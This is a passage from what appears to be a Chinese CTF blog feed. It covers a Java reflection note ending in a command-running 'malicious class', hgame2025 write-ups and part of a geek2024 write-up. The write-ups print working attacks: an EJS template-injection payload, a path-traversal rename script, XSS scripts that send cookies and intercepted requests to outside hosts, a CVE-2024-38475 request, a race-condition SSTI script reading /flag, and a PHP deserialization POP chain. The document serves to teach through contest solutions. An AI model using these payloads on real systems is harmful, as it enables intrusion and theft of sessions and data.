class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用方法：str.toUpperCase()</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(str); <span class="comment">// 参数为对象实例（str）和空参数</span></span><br><span class="line">        </span><br><span class="line">        System.out.println(result); <span class="comment">// 输出：HELLO</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例2：带参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MathUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取静态方法 add(int, int)</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> MathUtils.class.getMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用静态方法（obj 参数传 null）</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(<span class="literal">null</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(result); <span class="comment">// 输出：8</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="Field类：表示类的字段（成员变量），用于读写字段值。"><a href="#Field类：表示类的字段（成员变量），用于读写字段值。" class="headerlink" title="Field类：表示类的字段（成员变量），用于读写字段值。"></a><code>Field</code>类：表示类的字段（成员变量），用于读写字段值。</h4></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">field.set(obj, value);</span><br></pre></td></tr></table></figure><ul><li><h4 id="Modifier类：解析类、方法或字段的修饰符（如public、private）。"><a href="#Modifier类：解析类、方法或字段的修饰符（如public、private）。" class="headerlink" title="Modifier类：解析类、方法或字段的修饰符（如public、private）。"></a><code>Modifier</code>类：解析类、方法或字段的修饰符（如<code>public</code>、<code>private</code>）。</h4></li></ul><h1 id="恶意类示例"><a href="#恶意类示例" class="headerlink" title="恶意类示例"></a>恶意类示例</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2025</title>
      <link href="/2025/03/09/hgame2025/"/>
      <url>/2025/03/09/hgame2025/</url>
      
        <content type="html"><![CDATA[<h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>直接看index.js中有一段</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">here is your <span class="attr">gift</span>:aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br></pre></td></tr></table></figure><p>base64解码得:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br></pre></td></tr></table></figure><p>观察应该是栅栏密码<br>比较短，直接人肉还原一下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haeu4epca_4tr</span><br><span class="line">gm&#123;_r_amnmse&#125;</span><br></pre></td></tr></table></figure><p>然后竖着读</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;u_4re_pacman_m4ster&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>看题干以及代码，发现直接加载mortis.ejs运行，那么尝试进行覆盖<br>先构造:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;</span><br></pre></td></tr></table></figure><p>上传后使用rename接口进行覆盖,<br>尝试了几次后这个路径覆盖成功:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://119.45.235.21:30377/rename&quot;</span>  <span class="comment"># 替换为你的服务器地址</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;oldName&quot;</span>: <span class="string">&quot;mortis.ejs&quot;</span>,  <span class="comment"># 旧文件名</span></span><br><span class="line">    <span class="string">&quot;newName&quot;</span>: <span class="string">&quot;../views/mortis.ejs&quot;</span>   <span class="comment"># 新文件名</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=data)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: 500 &#123;&quot;error&quot;:&quot;重命名失败: ENOENT: no such file or directory, rename &#x27;/app/uploads/mortis.ejs&#x27; -&gt; &#x27;/app/static/mortis.ejs&#x27;&quot;&#125;</span><br><span class="line">Error: 500 &#123;&quot;error&quot;:&quot;重命名失败: ENOENT: no such file or directory, rename &#x27;/app/uploads/mortis.ejs&#x27; -&gt; &#x27;/views/mortis.ejs&#x27;&quot;&#125;</span><br><span class="line">Success: &#123;&#x27;message&#x27;: &#x27;文件重命名成功&#x27;&#125;</span><br></pre></td></tr></table></figure><p>覆盖后刷新网站首页查找hgame获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Av3_muJ1c4_haS-Br0keN_UP-BUt_We-h@Ve-UMiTaKi66&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-69-MysteryMessageBoard-1"><a href="#Level-69-MysteryMessageBoard-1" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>已知用户名:shallot<br>使用弱秘钥爆破得密码:888888</p><p>看题干猜测是xss<br>之前不知道怎么登录的时候发现有&#x2F;admin接口，确定是xss<br>劫持cookie:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">on_on_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://120.76.159.54:3389&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = on_on_load;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">// 基础数据收集</span></span><br><span class="line"><span class="keyword">const</span> attackerServer = <span class="string">&#x27;http://fy0gjk0x.requestrepo.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 拦截原生 fetch 方法</span></span><br><span class="line"><span class="keyword">const</span> originalFetch = <span class="variable language_">window</span>.<span class="property">fetch</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">fetch</span> = <span class="keyword">function</span>(<span class="params">url, options</span>) &#123;</span><br><span class="line">  <span class="comment">// 捕获请求数据</span></span><br><span class="line">  <span class="keyword">const</span> requestData = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;fetch&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">method</span>: options?.<span class="property">method</span> || <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: options?.<span class="property">headers</span> ? &#123;...options.<span class="property">headers</span>&#125; : &#123;&#125;,</span><br><span class="line">    <span class="attr">body</span>: options?.<span class="property">body</span> ? options.<span class="property">body</span>.<span class="title function_">toString</span>() : <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 发送到攻击服务器</span></span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(requestData));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> originalFetch.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 拦截 XMLHttpRequest</span></span><br><span class="line"><span class="keyword">const</span> originalXHROpen = <span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span>;</span><br><span class="line"><span class="keyword">const</span> originalXHRSend = <span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">send</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_method</span> = method;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_url</span> = url;</span><br><span class="line">  <span class="keyword">return</span> originalXHROpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">send</span> = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> requestData = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;xhr&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="variable language_">this</span>.<span class="property">_url</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="variable language_">this</span>.<span class="property">_method</span>,</span><br><span class="line">    <span class="attr">headers</span>: <span class="variable language_">this</span>.<span class="property">_headers</span> || &#123;&#125;,</span><br><span class="line">    <span class="attr">body</span>: body ? body.<span class="title function_">toString</span>() : <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(requestData));</span><br><span class="line">  <span class="keyword">return</span> originalXHRSend.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 捕获页面初始加载的Cookie</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = &#123;</span><br><span class="line">    <span class="attr">cookies</span>: <span class="variable language_">document</span>.<span class="property">cookie</span>,</span><br><span class="line">    <span class="attr">dom</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">outerHTML</span>,</span><br><span class="line">    <span class="attr">referrer</span>: <span class="variable language_">document</span>.<span class="property">referrer</span>,</span><br><span class="line">    <span class="attr">header</span>:<span class="variable language_">document</span></span><br><span class="line">  &#125;;</span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>劫持获得session：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MTczODU5MzU2N3xEWDhFQVFMX2dBQUJFQUVRQUFBbl80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWNBQldGa2JXbHV84eE9t0yI4-g4qaBupwIa27OI7uqu5Dje4mCGvbFzb2w=</span><br></pre></td></tr></table></figure><p>带着cookie扫目录发现&#x2F;flag<br>使用admin的cookie访问获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;W0w_y0u_5r4_9o0d_4t_xss&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h3><p>经过搜索发现是cve2024-38475<br>伪造请求进行开黑盒</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/usr/local/apache2/app/app.py%3F</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.hgame.vidar.club:32567</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>L1nk/</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = <span class="string">&#x27;&#x27;&#x27;Latest message: &#123;&#123;message&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">message = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">return</span> message</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">status = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(message) </span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line"><span class="keyword">return</span> render_template_string(show)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>重点关注read接口<br>一个括号都不给，乍一看没法ssti<br>但是我发现这个接口有问题，readmsg()进行了两次<br>一次判断一次实装<br>那么就可以以先通过判断再执行的方式绕过这个waf<br>第一次的消息大一点，读取进来之后有延时的效果<br>构造一个多线程的脚本:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">message</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node1.hgame.vidar.club:32567/app/send&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;message&#x27;</span>: message&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;发送消息 &#x27;<span class="subst">&#123;message&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://node1.hgame.vidar.club:32567/app/read&#x27;</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;读取文件响应：<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    send_message(<span class="string">&quot;a&quot;</span>*<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">    thread_read = threading.Thread(target=read_file)</span><br><span class="line">    thread_send = threading.Thread(target=send_message, args=(<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[140].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    thread_send.start()</span><br><span class="line">    thread_read.start()</span><br><span class="line">    </span><br><span class="line">    thread_send.join()</span><br><span class="line">    thread_read.join()</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;You-f1Nd-thE-Key_TO-RRRACE-OUUuut295edce&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>geek2024</title>
      <link href="/2025/03/07/geek2024/"/>
      <url>/2025/03/07/geek2024/</url>
      
        <content type="html"><![CDATA[<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/meimeng/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码，发现:</p><ul><li>漏洞利用点在<code>SYC</code>类的<code>file_put_contents</code>中</li><li>反序列化起始点在<code>lover</code>类</li><li>pop链逻辑为 lover(destruct) -&gt; Geek(get) -&gt; lover(invoke) -&gt; Geek(tostring) -&gt; SYC(call)</li></ul><p>poc如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span> = <span class="string">&quot;php://filter/write=string.strip_tags|?&gt;php_value auto_prepend_file &#x27;/flag&#x27;\n#/resource=.htaccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>=<span class="string">&#x27;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;abcabc&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s%3A7%3A%22meimeng&#x27;</span>,<span class="string">&#x27;S%3A7%3A%22%5C6deimeng&#x27;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><p>需要注意的绕过点:</p><ul><li>十六进制绕过<code>$meimeng</code>的正则匹配</li><li>伪协议绕过<code>$J1rry</code>的<code>file_get_content</code></li><li>绕过死亡<code>exit</code>的大部分<code>filter</code>被ban，只能使用<code>strip_tags</code>写.htaccess进行文件包含</li></ul><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h3><p>XSS题目<br><img src="/2025/03/07/geek2024/8GLFB4F8_2AE3U36QMA9U.png" alt="alt text"><br>发现不仅是starven学长能发表白语句，我们也能发<br>于是考虑<code>ssti模版注入</code><br>但尝试了多种模版注入，发现没有，但是有<code>XSS</code><br>点击下方第二个超链接,提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post 